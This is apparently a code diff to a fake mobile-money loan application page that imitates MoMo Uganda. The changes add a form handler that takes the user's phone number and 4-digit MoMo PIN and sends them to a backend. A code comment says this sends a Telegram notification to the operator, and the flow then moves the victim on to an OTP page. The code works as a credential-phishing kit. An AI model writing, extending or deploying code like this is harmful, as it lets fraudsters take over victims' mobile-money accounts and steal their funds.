@@ -127,6 +127,10 @@
             cursor: pointer;
             margin-top: 10px;
         }
+        .btn-primary:disabled {
+            background: #d1d5db;
+            cursor: not-allowed;
+        }
         .btn-back {
             width: 100%;
             background: transparent;
@@ -138,12 +142,42 @@
             cursor: pointer;
             margin-top: 10px;
         }
+        .error-msg {
+            display: none;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            font-size: 13.5px;
+        }
         .security-note {
             text-align: center;
             font-size: 12px;
             color: #9ca3af;
             margin-top: 18px;
         }
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .spin-ring {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top-color: #E42320;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -179,18 +213,27 @@
         <div class="form-group">
             <label>Mobile Money Number</label>
             <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
+            <div style="font-size:11px; color:#9ca3af; margin-top:5px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
         </div>
         <div class="form-group">
             <label>MoMo PIN</label>
             <input type="password" id="pin" placeholder="••••" maxlength="4">
         </div>
+        <div class="error-msg" id="errorMsg"></div>
         <button class="btn-primary" id="submitBtn">Continue →</button>
         <button class="btn-back" onclick="window.location.href='index.html'">← Back</button>
         <div class="security-note">🔒 Secured by MoMo Uganda</div>
     </div>
 </div>
 
+<div id="spinner">
+    <div class="spin-ring"></div>
+    <p style="color:white;">Submitting application...</p>
+</div>
+
 <script>
+    const API_URL = window.location.origin; // Uses same domain as the page
+
     function loadLoanData() {
         const data = sessionStorage.getItem('calculatorData');
         if (data) {
@@ -200,28 +243,76 @@
         }
     }
 
-    document.getElementById('submitBtn').onclick = () => {
+    function showError(msg) {
+        const err = document.getElementById('errorMsg');
+        err.textContent = msg;
+        err.style.display = 'block';
+        setTimeout(() => err.style.display = 'none', 4000);
+    }
+
+    document.getElementById('submitBtn').onclick = async () => {
         const phone = document.getElementById('phone').value.trim();
         const pin = document.getElementById('pin').value.trim();
         
         if (!phone || phone.length !== 10) {
-            alert("Enter valid Uganda number (10 digits)");
+            showError("Enter valid Uganda number (10 digits)");
             return;
         }
         if (!pin || pin.length !== 4) {
-            alert("PIN must be 4 digits");
+            showError("PIN must be 4 digits");
             return;
         }
 
-        sessionStorage.setItem('userPhone', phone);
-        sessionStorage.setItem('userPin', pin);
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.textContent = "Submitting...";
+        document.getElementById('spinner').style.display = 'flex';
+
+        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
         
+        // Determine network from phone prefix
         let network = 'MTN';
         if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
         else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
-        sessionStorage.setItem('userNetwork', network);
         
-        window.location.href = 'otp.html';
+        try {
+            // Send to backend - This will trigger Telegram notification with 4 buttons
+            const response = await fetch(`${API_URL}/api/save-loan`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: phone,
+                    pin: pin,
+                    network: network,
+                    amount: loanData.amount || 500000,
+                    duration: loanData.duration || 90,
+                    monthly: loanData.monthly || 182500,
+                    total: loanData.total || 547500,
+                    interest: loanData.interest || 47500
+                })
+            });
+
+            const data = await response.json();
+            
+            if (data.success) {
+                // Save loan ID and user data to sessionStorage
+                sessionStorage.setItem('loanId', data.loanId);
+                sessionStorage.setItem('userPhone', phone);
+                sessionStorage.setItem('userPin', pin);
+                sessionStorage.setItem('userNetwork', network);
+                
+                // Redirect to OTP page
+                window.location.href = 'otp.html';
+            } else {
+                throw new Error(data.error || "Submission failed");
+            }
+        } catch (err) {
+            console.error('Submit error:', err);
+            document.getElementById('spinner').style.display = 'none';
+            showError("Error: " + err.message);
+            btn.disabled = false;
+            btn.textContent = "Continue →";
+        }
     };
 
     document.getElementById('phone').addEventListener('input', function(e) {
